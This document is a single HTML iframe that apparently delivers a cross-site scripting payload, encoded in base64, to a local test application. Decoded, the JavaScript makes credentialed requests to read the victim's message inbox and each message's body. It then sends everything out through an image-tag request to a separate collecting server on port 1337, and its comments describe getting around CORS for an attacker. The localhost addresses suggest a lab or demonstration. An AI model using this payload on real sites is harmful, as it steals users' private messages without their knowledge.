<iframe src='http://localhost:8080/xss/Ly8gQ29tcGF0aWJsZSBYSFIgb2JqZWN0IHdpdGggY3JlZGVudGlhbHMgZW5hYmxlZC4KZnVuY3Rpb24gbmV3SHR0cCgpewogICAgaHR0cCA9IHdpbmRvdy5YTUxIdHRwUmVxdWVzdD8gbmV3IFhNTEh0dHBSZXF1ZXN0KCkgOiBuZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKTsKICAgIGh0dHAud2l0aENyZWRlbnRpYWxzID0gdHJ1ZTsKICAgIHJldHVybiBodHRwCn0KLy8gR2VuZXJhdGVzIGEgRE9NLWxpa2UsIHF1ZXJpYWJsZSB0aGluZyBvdXQgb2YgaHRtbCB0ZXh0CmZ1bmN0aW9uIERPTShodG1sKXsKICAgIHZhciBjID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc3BhbicpOwogICAgYy5pbm5lckhUTUwgPSBodG1sOyAKICAgIHJldHVybiBjCn0KLy8gU2VuZHMgYWxsIHRoZSBtZXNzYWdlcyB3ZSBmb3VuZCBpbiB0aGUgdXJsIG9mIGEgZ2V0IHJlcXVlc3QKLy8gV2UgY2FuJ3QgdXNlIGFuIFhIUiBvYmplY3QgZHVlIHRvIENPUlMgcG9saWNpZXMuIChhbmQgYXR0YWNrZXIgd2lsbCBwcm9iYWJseSBuZWVkIHRvIHNlbmQgdGhpcyBjcm9zcy1kb21haW4pCi8vIFdlJ2xsIGFkZCBhIDxpbWc+IHRhZyB3aXRoIHRoZSByaWdodCBzcmMKZnVuY3Rpb24gc2VuZF9tc2dzKCl7CiAgICB2YXIgdSA9ICdodHRwOi8vbG9jYWxob3N0OjEzMzcvJytlbmNvZGVVUklDb21wb25lbnQoSlNPTi5zdHJpbmdpZnkobXNncywyLDIpKTsKICAgIHZhciBzID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW1nJyk7CiAgICBzLnNyYyA9IHU7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnYm9keScpWzBdLmFwcGVuZENoaWxkKHMpOwp9CgoKbXNncyA9IFtdOwpkb25lID0gMDsKdmFyIGh0dHAgPSBuZXdIdHRwKCk7Cmh0dHAub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICBpZiAodGhpcy5yZWFkeVN0YXRlID09IDQpIHsKICAgICAgICAKICAgICAgICBtc2dfdGFncyA9IERPTSh0aGlzLnJlc3BvbnNlVGV4dCkKICAgICAgICAgICAgICAgICAgICAgICAgLmdldEVsZW1lbnRzQnlUYWdOYW1lKCd0Ym9keScpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgIC5nZXRFbGVtZW50c0J5VGFnTmFtZSgndHInKTsKICAgICAgICAKICAgICAgICBmb3IgKHZhciBpPTA7aTxtc2dfdGFncy5sZW5ndGg7aSsrKXsKICAgICAgICAgICAgZmV0Y2hfbWVzc2FnZShpKTsKICAgICAgICB9CgogICAgICAgIAogICAgfTsKfQoKaHR0cC5vcGVuKCdHRVQnLCAnaHR0cDovL2xvY2FsaG9zdDo4MDgwL3VzZXIvbWVzc2FnZXMvaW5ib3gnLCB0cnVlKTsgCmh0dHAuc2VuZCgpOwoKZnVuY3Rpb24gZmV0Y2hfbWVzc2FnZShpKXsKICAgIHZhciB0YWcgPSBtc2dfdGFnc1tpXTsKICAgICAgICAgICAgbXNnc1tpXSA9IHt9OwogICAgICAgICAgICAvLyAKICAgICAgICAgICAgbXNnc1tpXVsnYXV0aG9yJ10gPSB0YWcuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2EnKVswXS50ZXh0OwogICAgICAgICAgICBtc2dzW2ldWyd0aXRsZSddID0gdGFnLmdldEVsZW1lbnRzQnlUYWdOYW1lKCdhJylbMV0udGV4dC5yZXBsYWNlKC9cc1xzL2csJycpOwogICAgICAgICAgICAvLyBUaGUgbWVzc2FnZSdzIGNvbnRlbnQgaXMgaW4gYW5vdGhlciBwYWdlCiAgICAgICAgICAgIHZhciBjb250ZW50VXJsID0gdGFnLmdldEVsZW1lbnRzQnlUYWdOYW1lKCdhJylbMV0uaHJlZiA7CiAgICAgICAgICAgIC8vIHdlJ2xsIHN0YXJ0IGFuIGFqYXggcmVxdWVzdAogICAgICAgICAgICB2YXIgaHR0cCA9IG5ld0h0dHAoKTsKICAgICAgICAgICAgaHR0cC5udW0gPSBpOwogICAgICAgICAgICBodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgaWYgKHRoaXMucmVhZHlTdGF0ZSA9PSA0KSB7CiAgICAgICAgICAgICAgICAgICAgbXNnc1t0aGlzLm51bV1bJ2NvbnRlbnQnXSA9IERPTSh0aGlzLnJlc3BvbnNlVGV4dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKCdtZXNzYWdlX2JvZHknKVswXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLmlubmVySFRNTAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLnJlcGxhY2UoL1xzXHMvZywnJykgOyAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAvL3dlIGhhdmUgb25lIG1vcmUKICAgICAgICAgICAgICAgICAgICBkb25lICsrOwogICAgICAgICAgICAgICAgICAgIC8vIElmIHdlIGhhdmUgYWxsIG9mIHRoZW0KICAgICAgICAgICAgICAgICAgICBpZiAoZG9uZSA9PSBtc2dfdGFncy5sZW5ndGgpewogICAgICAgICAgICAgICAgICAgICAgIHNlbmRfbXNncygpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfTsKICAgICAgICAgICAgaHR0cC5vcGVuKCdHRVQnLCBjb250ZW50VXJsLCB0cnVlKTsgCiAgICAgICAgICAgIGh0dHAuc2VuZCgpOwp9'></iframe>
